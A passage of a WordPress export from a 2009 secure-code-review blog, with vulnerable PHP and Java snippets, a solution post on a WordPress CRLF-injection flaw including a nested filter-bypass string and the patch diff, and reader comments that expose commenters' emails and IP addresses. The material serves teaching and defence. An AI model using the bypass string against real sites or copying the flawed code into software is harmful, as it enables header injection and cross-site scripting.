			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[Can you identify the security vulnerability in this code snippet?]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[0896e6c87af7910c6785096d54d7a8ea]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/b5vUAz]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>5</wp:comment_id>
			<wp:comment_author><![CDATA[Nitin Reddy Katkam]]></wp:comment_author>
			<wp:comment_author_email>k_nitin_r@yahoo.co.in</wp:comment_author_email>
			<wp:comment_author_url>http://www.nitinkatkam.com/wordpress/</wp:comment_author_url>
			<wp:comment_author_IP>195.229.241.171</wp:comment_author_IP>
			<wp:comment_date>2009-09-21 09:16:34</wp:comment_date>
			<wp:comment_date_gmt>2009-09-21 16:16:34</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Argh! Regular expressions!! :-(  Not my Forte, but I'll take some time to decipher them.

BTW, is this a snippet from a WordPress plugin? Although I haven't looked at much PHP code, the apply_filters scheme looks vary similar to the stuff that WordPress plugins are made of (I developed plugins and a theme for WP once).]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>7</wp:comment_id>
			<wp:comment_author><![CDATA[Jack]]></wp:comment_author>
			<wp:comment_author_email>jack@mainhack.net</wp:comment_author_email>
			<wp:comment_author_url>http://www.serverisdown.org</wp:comment_author_url>
			<wp:comment_author_IP>114.58.44.162</wp:comment_author_IP>
			<wp:comment_date>2009-09-21 16:47:18</wp:comment_date>
			<wp:comment_date_gmt>2009-09-21 23:47:18</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[may i get entire code?]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>8</wp:comment_id>
			<wp:comment_author><![CDATA[Johnny Cocaine]]></wp:comment_author>
			<wp:comment_author_email>johnnycocaine@gawab.com</wp:comment_author_email>
			<wp:comment_author_url>http://johnnycocaine.wordpress.com</wp:comment_author_url>
			<wp:comment_author_IP>65.111.173.249</wp:comment_author_IP>
			<wp:comment_date>2009-09-22 07:18:52</wp:comment_date>
			<wp:comment_date_gmt>2009-09-22 14:18:52</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[OK, I can't resist.

Mainly, this script is backwards - it cleans a few known dangerous characters rather than only allowing known good characters.  In fact, it still allows most ASCII characters including things that have special meanings to shell, etc., like !, *, etc.  It allows % so could do a format string attack on printf.  It allows url encoded characters other than \n and \r.  It allows ASCII / hex encoding so you could pass a control (^), ESC, etc.  It doesn't prevent buffer overflows.

Also, it returns the original URL, which hasn't been cleaned.  No point in trying to clean it then accessing the tainted variable later.  Dump it.

Finally, it's in PHP.  :-)]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>9</wp:comment_id>
			<wp:comment_author><![CDATA[Roy]]></wp:comment_author>
			<wp:comment_author_email>roysteves@gmail.com</wp:comment_author_email>
			<wp:comment_author_url>http://www.darktaco.com</wp:comment_author_url>
			<wp:comment_author_IP>128.170.62.95</wp:comment_author_IP>
			<wp:comment_date>2009-09-24 10:42:49</wp:comment_date>
			<wp:comment_date_gmt>2009-09-24 17:42:49</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[I generally try to specify which characters I WILL allow, as then I don't have to worry about which esoteric characters the attacker might come up with.

So, if the vulnerability is in the regex filter, I claim a win.

I'm still looking for a logical vulnerability, though...]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>11</wp:comment_id>
			<wp:comment_author><![CDATA[Eduardo Habkost]]></wp:comment_author>
			<wp:comment_author_email>ehabkost@raisama.net</wp:comment_author_email>
			<wp:comment_author_url>http://raisama.net/diary/</wp:comment_author_url>
			<wp:comment_author_IP>201.22.13.109</wp:comment_author_IP>
			<wp:comment_date>2009-09-25 09:49:38</wp:comment_date>
			<wp:comment_date_gmt>2009-09-25 16:49:38</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[I had to look at the wordpress code to understand what this function is expected to do. It is impossible to know what could be a security vulnerability on the code without knowing how the function output is going to be used.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>These Pipes are Clean - CRLF</title>
		<link>http://spotthevuln.com/2009/09/crlf-injection-url-redirection-these-pipes-are-clean/</link>
		<pubDate>Fri, 25 Sep 2009 15:00:09 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=170</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
<strong>Affected Software: </strong><a href="http://spotthevuln.com/category/software/wordpress/">Wordpress</a>

<strong>Fixed in Version: </strong>2.8.1

<strong>Issue Type:</strong> <a href="http://spotthevuln.com/category/vulnerability/URL-redirection/">URL Redirection</a> / <a href="http://spotthevuln.com/category/vulnerability/CRLF-Injection/">CRLF Injection</a> / <a href="http://spotthevuln.com/category/vulnerability/HTTP-Header-Injection/">HTTP Header Injection</a> / <a href="http://spotthevuln.com/category/vulnerability/xss/">XSS</a>

<strong>Original Code: </strong><a href="http://spotthevuln.com/2009/09/vulnerable-code-these-pipes-are-clean/">Found Here</a>
<h2>Description</h2>
When appended together the %0d (Carriage Return) and %0a (Line Feed) characters represent a Carriage Return Line Feed (CRLF).

The vulnerable WordPress code snippet actually contained logic to detect carriage returns and line feed characters, attempting to strip CRLF from data being assigned to the $url variable.

The CRLF detection logic used by the vulnerable WordPress version was not very robust.  The CRLF detection logic simply checked for the presence of “%0d" and "%0a” in the $url variable and failed to consider UPPERCASE "%0D" or "%0A".  The $url variable is assigned the CRLF tainted string and eventually passed to a HTTP Location header, giving the attacker an opportunity for URL Redirection, CRLF injection, HTTP header injection, and even <a href="http://misc-security.com/2009/05/21/xss-cross-site-scripting/">Cross Site Scripting (XSS)</a>.

In addition to adding UPPERCASE variants of "%0D" and "%0A" to the detection logic, a function to recursively detect the presence of CRLF was also added.  Before this function was added, it was possible to defeat the detection logic by simply passing a string such as %0%0d%0ad%0%0d%0aa which would have “%0d%0a” character sequences stripped out, resulting in %0d%0a being passed to the $url variable.  The WordPress developers addressed this issue by adding a recursive verifier (_deep_request()), whose source is included in the Developers Solution.
<h2>Developers Solution</h2>
[cc lang="diff"]

function clean_url( $url, $protocols = null, $context = 'display' ) {
$original_url = $url;

if ('' == $url) return $url;
$url = preg_replace('|[^a-z0-9-~+_.?#=!&amp;;,/:%@$\|*\'()\\x80-\\xff]|i', '', $url);
-       $strip = array('%0d', '%0a');
-       $url = str_replace($strip, '', $url);
+       $strip = array('%0d', '%0a', '%0D', '%0A');
+       $url = _deep_replace($strip, $url);
$url = str_replace(';//', '://', $url);
/* If the URL doesn't appear to contain a scheme, we
* presume it needs http:// appended (unless a relative
* link starting with / or a php file).
*/
if ( strpos($url, ':') === false &amp;&amp;
substr( $url, 0, 1 ) != '/' &amp;&amp; substr( $url, 0, 1 ) != '#' &amp;&amp; !preg_match('/^[a-z0-9-]+?\.php/i', $url) )
$url = 'http://' . $url;

// Replace ampersands and single quotes only when displaying.
if ( 'display' == $context ) {
$url = preg_replace('/&amp;([^#])(?![a-z]{2,8};)/', '&amp;$1', $url);
$url = str_replace( "'", ''', $url );
}

if ( !is_array($protocols) )
$protocols = array('http', 'https', 'ftp', 'ftps', 'mailto', 'news', 'irc', 'gopher', 'nntp', 'feed', 'telnet');
if ( wp_kses_bad_protocol( $url, $protocols ) != $url )
return '';

return apply_filters('clean_url', $url, $original_url, $context);
}

With _DEEP_REPLACE for recursive checks!
+/**
+ * Perform a deep string replace operation to ensure the values in $search are no longer present
+ *
+ * Repeats the replacement operation until it no longer replaces anything so as to remove "nested" values
+ * e.g. $subject = '%0%0%0DDD', $search ='%0D', $result ='' rather than the '%0%0DD' that
+ * str_replace would return
+ *
+ * @since 2.8.1
+ * @access private
+ *
+ * @param string|array $search
+ * @param string $subject
+ * @return string The processed string
+ */
+function _deep_replace($search, $subject){
+        $found = true;
+        while($found) {
+                $found = false;
+                foreach( (array) $search as $val ) {
+                        while(strpos($subject, $val) !== false) {
+                                $found = true;
+                                $subject = str_replace($val, '', $subject);
+                        }
+                }
+        }
+
+        return $subject;
+}

[/cc] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>170</wp:post_id>
		<wp:post_date>2009-09-25 08:00:09</wp:post_date>
		<wp:post_date_gmt>2009-09-25 15:00:09</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>crlf-injection-url-redirection-these-pipes-are-clean</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="crlf-injection"><![CDATA[Carriage Return/Line Feed (CRLF) Injection]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="category" nicename="http-header-injection"><![CDATA[HTTP header injection]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="url-redirection"><![CDATA[URL Redirection]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Carriage Return Line-Feed (CRLF) Vulnerable Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[Carriage Return Line Feed Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[7369dd991e98a22b00a63eb0be973734]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/caO0rg]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[7369dd991e98a22b00a63eb0be973734]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>14</wp:comment_id>
			<wp:comment_author><![CDATA[johnnycocaine]]></wp:comment_author>
			<wp:comment_author_email>johnnycocaine@gawab.com</wp:comment_author_email>
			<wp:comment_author_url>http://johnnycocaine.wordpress.com</wp:comment_author_url>
			<wp:comment_author_IP>65.111.173.249</wp:comment_author_IP>
			<wp:comment_date>2009-09-28 07:15:32</wp:comment_date>
			<wp:comment_date_gmt>2009-09-28 14:15:32</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[

Mainly, this script is backwards – it cleans a few known dangerous characters rather than only allowing known good characters.  In fact, it still allows most ASCII characters including things that have special meanings to shell, etc., like !, *, etc.  It allows % so could do a format string attack on printf.  It allows url encoded characters other than \n and \r.  It allows ASCII / hex encoding so you could pass a control (^), ESC, etc.  It doesn’t prevent buffer overflows.  Since the URL can contain non-http schemes (ftp, etc.), there may be dangerous characters we wouldn't normally think of (would passing ^D to telnet:// cause it to immediately break?)

Also, it returns the original URL, which hasn’t been cleaned.  No point in trying to clean it then accessing the tainted variable later.  Dump it.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>12</wp:comment_id>
			<wp:comment_author><![CDATA[Eduardo Habkost]]></wp:comment_author>
			<wp:comment_author_email>ehabkost@raisama.net</wp:comment_author_email>
			<wp:comment_author_url>http://raisama.net/diary/</wp:comment_author_url>
			<wp:comment_author_IP>201.22.13.109</wp:comment_author_IP>
			<wp:comment_date>2009-09-25 10:05:03</wp:comment_date>
			<wp:comment_date_gmt>2009-09-25 17:05:03</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[I dont't know if I understood the vulnerability correctly:

* If %0a/%0d sequences on URLs is going to make HTTP clients misbehave, shouldn't the client be fixed instead of the code that generate the HTML links to URLs?

* And if it going to make the server that the URL point to misbehave, shouldn't the server be fixed, instead of fixing the code that generate URLs pointing to that server?

* If the HTTP Location header is being generated after decoding the URL % escaped bytes, shouldn't the code stop decoding the bytes before generating the Location header, instead of trying to clean potentially-valid URLs?

The three cases above look like fixing the problem on the wrong place (and not fixing the real problem). Am I missing something?]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>13</wp:comment_id>
			<wp:comment_author><![CDATA[Jeff Williams]]></wp:comment_author>
			<wp:comment_author_email>jeff.williams@aspectsecurity.com</wp:comment_author_email>
			<wp:comment_author_url>http://www.aspectsecurity.com</wp:comment_author_url>
			<wp:comment_author_IP>66.255.82.2</wp:comment_author_IP>
			<wp:comment_date>2009-09-25 12:44:21</wp:comment_date>
			<wp:comment_date_gmt>2009-09-25 19:44:21</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Enjoying the vulnerability spotting and I had a comment on the WordPress solution. If you receive double or nested encoding, you are under attack. You should probably NOT do the recursive canonicalization, but should log out the user, cancel their account, and call the police...or something. The OWASP ESAPI canonicalization routines handle all forms of double and nested encoding, but default to "strict" mode where these are disallowed.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Attack the Hot Fudge Sundae</title>
		<link>http://spotthevuln.com/2009/10/vulnerable-source-code-hot-fudge-sundae/</link>
		<pubDate>Mon, 05 Oct 2009 15:00:51 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=186</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote>Any reviewer who expresses rage and loathing for a novel is preposterous. He or she is like a person who has put on full armor and attacked a hot fudge sundae.
- Kurt Vonnegut (1922 - 2007)</blockquote>
[ccnLe_php]

/**
* Update a post with new post data.
*
* The date does not have to be set for drafts. You can set the date and it will
* not be overridden.
*
* @since 1.0.0
*
* @param array|object $postarr Post data.
* @return int 0 on failure, Post ID on success.
*/
function wp_update_post($postarr = array()) {
if ( is_object($postarr) )
$postarr = get_object_vars($postarr);

// First, get all of the original fields
$post = wp_get_single_post($postarr['ID'], ARRAY_A);

// Escape data pulled from DB.
$post = add_magic_quotes($post);

// Passed post category list overwrites existing category list if not empty.
if ( isset($postarr['post_category']) &amp;&amp; is_array($postarr['post_category'])
&amp;&amp; 0 != count($postarr['post_category']) )
$post_cats = $postarr['post_category'];
else
$post_cats = $post['post_category'];

// Drafts shouldn't be assigned a date unless explicitly done so by the user
if ( in_array($post['post_status'], array('draft', 'pending')) &amp;&amp; empty($postarr['edit_date']) &amp;&amp;
('0000-00-00 00:00:00' == $post['post_date_gmt']) )
$clear_date = true;
else
$clear_date = false;

// Merge old and new fields with new fields overwriting old ones.
$postarr = array_merge($post, $postarr);
$postarr['post_category'] = $post_cats;
if ( $clear_date ) {
$postarr['post_date'] = current_time('mysql');
$postarr['post_date_gmt'] = '';
}

if ($postarr['post_type'] == 'attachment')
return wp_insert_attachment($postarr);

return wp_insert_post($postarr);
}

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>186</wp:post_id>
		<wp:post_date>2009-10-05 08:00:51</wp:post_date>
		<wp:post_date_gmt>2009-10-05 15:00:51</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>vulnerable-source-code-hot-fudge-sundae</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Vulnerable Source Code]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[Can you identify the security vulnerability in this code snippet?]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[7d4f54d304572689907d32237c3853a8]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/b9ECPh]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Spot The Vuln</title>
		<link>http://spotthevuln.com/2009/09/spot-the-vuln/</link>
		<pubDate>Thu, 17 Sep 2009 02:14:05 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=244</guid>
		<description></description>
		<content:encoded><![CDATA[<p style="text-align: center;"><img class="size-full wp-image-247 aligncenter" title="wtfm" src="http://spotthevuln.com/wordpress/wp-content/uploads/2009/09/wtfm.jpg" alt="wtfm" width="420" height="395" /></p>

<strong> </strong>
<h2><strong>Purpose</strong></h2>
spotthevuln.com was created by <a href="http://spotthevuln.com/about-spot-the-vuln/">two security professionals</a> who wanted to give something back to the community. The intent of this blog is to provide examples of real world vulnerabilities affecting real world software. The examples provided are from open source software packages with the focus being on web applications.

We hope security professionals find the blog interesting, but we also hope to reach non-security professionals across multiple disciplines including development, quality assurance, and management. Individuals who are looking for a quick security challenge or an introduction to reviewing code from a security perspective.

<strong> </strong>
<h2><strong>Logistics</strong></h2>
The samples will cover various coding languages and a variety of issues. We will post a vulnerable code snippet every <strong>Monday at 8am (PST)</strong>. The solution to the vulnerable code will be posted on the following <strong>Friday at 8am (PST)</strong>.

If you plan on using samples from this blog as a part of a formal course of instruction or a teaching aid, you can count on one (1) vulnerability along with its solution to be presented every week.

Please feel free to leave your thoughts and comments on the blog. Your comments can cover vulnerabilities and/or the solutions. <strong>All comments from readers will be held in moderation until the code fix is posted on Friday</strong> to avoid the possibility of spoilers.
<h2><strong>Quality of Code Fixes / Solutions</strong></h2>
Please remember, the authors of this blog <strong><em>DID NOT</em></strong> write the code fixes that will be posted. Instead, we simply present the code fix developed by the affected software development team, along with some analysis of the code fix.

We <em><strong>have no control over</strong> </em>the code fix quality, security robustness, nor can we definitively state why the development teams would choose a certain strategy over another.
<h2><strong>Making the Most of SpotTheVuln</strong></h2>
This blog focuses on source code analysis from a security perspective. The reader should keep in mind that writing code is only one piece of the engineering effort required to create and maintain large complex software projects. The integration of development, quality assurance, and management disciplines are essential in the smooth execution of software creation and maintenance.

Once the solution sets are posted the reader can broaden their perspective by asking themselves questions such as:
<ul>
	<li>Is the code fix implemented by the software organization a good one? Why or why not?</li>
	<li>Why did the organization choose to fix the vulnerability in the manner they did?</li>
	<li>How would you test a code base consisting of 100,000 dynamic pages for similar vulnerabilities?</li>
	<li>How would one test to ensure the fix is robust and comprehensive?</li>
	<li>What testing criteria would make a good quality gate?</li>
	<li>What engineering/administrative/automated gates can be created to ensure similar a vulnerably doesn’t make its way into future code check-ins?</li>
</ul>
<h2><strong>Final Thoughts</strong></h2>
We hope you find spotthevuln.com to be a fun way to spend a few minutes each week. If you have any suggestions or would like to submit a vulnerability to the site, please contact us at: <a href="mailto:spotthevuln (shift 2) gmail.com">spotthevuln (shift 2) gmail.com</a> Happy Hunting!

-- Respectfully,

SpotTheVuln.com]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>244</wp:post_id>
		<wp:post_date>2009-09-16 19:14:05</wp:post_date>
		<wp:post_date_gmt>2009-09-17 02:14:05</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>spot-the-vuln</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="information"><![CDATA[Information]]></category>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[Finding vulnerabilities in code is a skill that can be obtained by practice. Use spot the vuln to hone your skills to find security vulnerabilities.]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[How to spot vulnerabilities in source Code]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/3Cmeh4]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[9e42876374235e62ab8a1a118c67c2c1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>4</wp:comment_id>
			<wp:comment_author><![CDATA[Nitin Reddy Katkam]]></wp:comment_author>
			<wp:comment_author_email>k_nitin_r@yahoo.co.in</wp:comment_author_email>
			<wp:comment_author_url>http://www.nitinkatkam.com/wordpress/</wp:comment_author_url>
			<wp:comment_author_IP>86.96.226.16</wp:comment_author_IP>
			<wp:comment_date>2009-09-21 09:12:21</wp:comment_date>
			<wp:comment_date_gmt>2009-09-21 16:12:21</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Hi!

I like the idea you guys are working toward - a spot-the-vulnerability code snippet every week. I know I'll visit often to look for the vulns :-)

-Nitin]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>wtfm</title>
		<link>http://spotthevuln.com/2009/09/spot-the-vuln/wtfm/</link>
		<pubDate>Tue, 15 Sep 2009 23:53:47 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/wordpress/wp-content/uploads/2009/09/wtfm.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>247</wp:post_id>
		<wp:post_date>2009-09-15 16:53:47</wp:post_date>
		<wp:post_date_gmt>2009-09-15 23:53:47</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>wtfm</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>244</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://spotthevuln.com/wordpress/wp-content/uploads/2009/09/wtfm.jpg</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2009/09/wtfm.jpg]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"500";s:6:"height";s:3:"471";s:14:"hwstring_small";s:23:"height='96' width='101'";s:4:"file";s:16:"2009/09/wtfm.jpg";s:5:"sizes";a:2:{s:9:"thumbnail";a:3:{s:4:"file";s:16:"wtfm-150x150.jpg";s:5:"width";s:3:"150";s:6:"height";s:3:"150";}s:6:"medium";a:3:{s:4:"file";s:16:"wtfm-300x282.jpg";s:5:"width";s:3:"300";s:6:"height";s:3:"282";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Disorderly Discovery</title>
		<link>http://spotthevuln.com/2009/09/vulnerable-code-disorderly-discovery/</link>
		<pubDate>Mon, 28 Sep 2009 15:00:33 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=282</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote>One of the advantages of being disorderly is that one is constantly making exciting discoveries.
- A. A. Milne</blockquote>
<h2>Vulnerable Code</h2>
[ccnLe_java]
public class TabTag extends WikiTagBase {
private static final long serialVersionUID = -8534125226484616489L;
private String m_accesskey;
private String m_tabID;
private String m_tabTitle;
private String m_url;

public void setId(String aTabID) {
m_tabID = aTabID;
}

public void setTitle(String aTabTitle) {
m_tabTitle = aTabTitle;
}

public void setAccesskey(String anAccesskey) {
m_accesskey = anAccesskey; // take only the first char
}

public void setUrl(String url) {
m_url = url;
}

public int doWikiStartTag() throws JspTagException {
TabbedSectionTag parent = (TabbedSectionTag) findAncestorWithClass(this, TabbedSectionTag.class);

if (m_tabID == null) {
throw new JspTagException("Tab Tag without \"id\" attribute");
}
if (m_tabTitle == null) {
throw new JspTagException("Tab Tag without \"tabTitle\" attribute");
}
if (parent == null) {
throw new JspTagException("Tab Tag without parent \"TabbedSection\" Tag");
}

if (!parent.isStateGenerateTabBody())
return SKIP_BODY;

StringBuffer sb = new StringBuffer(32);

sb.append("&lt;div id=\"" + m_tabID + "\"");

if (!parent.validateDefaultTab(m_tabID)) {
sb.append(" class=\"hidetab\"");
}
sb.append(" &gt;\n");

try {
pageContext.getOut().write(sb.toString());
} catch (java.io.IOException e) {
throw new JspTagException("IO Error: " + e.getMessage());
}

return EVAL_BODY_INCLUDE;
}
}

[/ccnLe_java] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>282</wp:post_id>
		<wp:post_date>2009-09-28 08:00:33</wp:post_date>
		<wp:post_date_gmt>2009-09-28 15:00:33</wp:post_date_gmt>
